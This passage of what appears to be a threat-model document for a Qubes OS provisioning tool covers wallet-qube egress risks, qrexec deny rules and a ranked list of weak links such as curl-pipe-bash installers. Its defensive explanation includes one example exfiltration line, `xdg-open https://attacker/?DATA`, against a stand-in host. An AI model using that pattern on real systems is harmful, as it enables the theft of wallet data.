    - frame social-engineering prompts ("approve this Permit2") that look identical to the legitimate UX because they *are* the legitimate UX, just pointed at an attacker-controlled backend.

  The hardware wallet still enforces *its* on-device confirmation, so the spoofer cannot forge a signed transaction — but the **contents** the operator is asked to confirm come from the host stack, and the host stack has unrestricted egress. Wallet-extension supply-chain incidents (Ledger Connect Kit 2023; the npm chalk/debug compromise in 2025) are recurring; the assumption that "the extension will not phone home maliciously" is empirically not safe.

  Deferred — accepted as a default because RPC endpoint sets are operator-specific. The recommended hardening when you know your endpoints is a default-deny allow-list for the qube: the `firewall` catalogue key (see [configuration](docs/configuration.md)), which every build that selects the qube reapplies (Qubes enforces it in the qube's NetVM, which must run the `qubes-firewall` service, as `sys-firewall` does, and SEQS neither sets nor checks that NetVM; a `'dns'` entry allows lookups of any name, so DNS stays a channel out), or a per-qube `qvm-firewall` rule set written from dom0 against the live IP set (typical: your RPC provider's hostnames, `clients2.google.com` for extension auto-update if you keep that channel, and any block-explorer you actually use). The cost is breakage every time an endpoint rotates; the benefit is that the extension no longer faces an open door if it ever turns.

  **One layer is no longer deferred:** the default wallet qube specs carry the `no_handoff` flag, which tags them `seqs-no-handoff` for the dom0 qrexec deny rules (28-browser-suppress.policy) on `qubes.OpenURL` from each wallet qube to any target, and for every default route into a networked disposable (such as `qubes.VMShell`), AND skips wiring the per-qube xdg `xdg-open → A-brave` handler. Without this, a compromised wallet extension could ferry data out via `xdg-open https://attacker/?DATA` routed through the open handoff policy — bypassing any `qvm-firewall` lockdown the operator later adds (qvm-firewall does not gate qrexec). These back-channels are now closed by default for wallet qubes; the egress allowlist above remains the operator's job for the rest of the egress surface.

---

## Weakest links, ranked

1. **USB-keyboard policy override** (§4) — weakens the Qubes 4.3 default `deny` on `qubes.InputKeyboard sys-usb → dom0` to `ask default_target=@adminvm`. A BadUSB-class device that enumerates as a HID keyboard yields keystroke injection into dom0 = total compromise if the operator reflexively accepts the attach prompt. Accepted in exchange for external USB keyboards working without per-boot `qvm-input-keyboard` ceremony; `usb_keyboard_prompt = False` opts out and keeps the `deny`.
2. **curl-pipe-bash installers** (§3) — the `python` (pyenv), `node` (nvm) and `claude-code` components execute unreviewed remote code on install. For pyenv and nvm this is a deliberate tradeoff for dev-version flexibility; see their entries.
3. **`REPO_VM` + the fetch** (§2) — the repo and its host qube are dom0-equivalent in effect because fetched data can become root-executed Salt code. Validation and separate fetch/stage/build boundaries help only if the operator reviews the fetched tree.
4. **Self-updating, unpinned channels** (§3) — force-installed Brave extensions take whatever the Chrome Web Store serves, and the Telegram snap auto-updates from the snap store; neither is version- or hash-pinned.

Brave, KeePassXC, Signal, Docker, VS Code, Proton VPN, BitBoxApp, Apache OpenOffice, Element and Ledger Live (§3) verify their signing keys/signatures against pinned, cross-checked fingerprints, GnosisVPN (§4) against a fingerprint from the project alone, and the apt-repo keyrings (Brave, Signal, Element, Docker, VS Code, Proton VPN, GnosisVPN) are then `chattr +i`'d so a maintainer-script rewrite of the trust anchor inside an allowlisted package would fail loudly instead of silently rotating; the curl-pipe installers (pyenv, nvm, Claude Code) remain unverified, and the Brave extensions and the Telegram snap unpinned.

The browser-link handoff is closed by default for `offline`, `no_handoff` and `firewall` qubes: dom0 denies `qubes.OpenURL` and every default route into a networked disposable, and the per-qube default browser is not set to the handoff handler. `offline` implies `no_handoff`. The default wallet qubes carry `no_handoff`, and keepass carries `offline`.
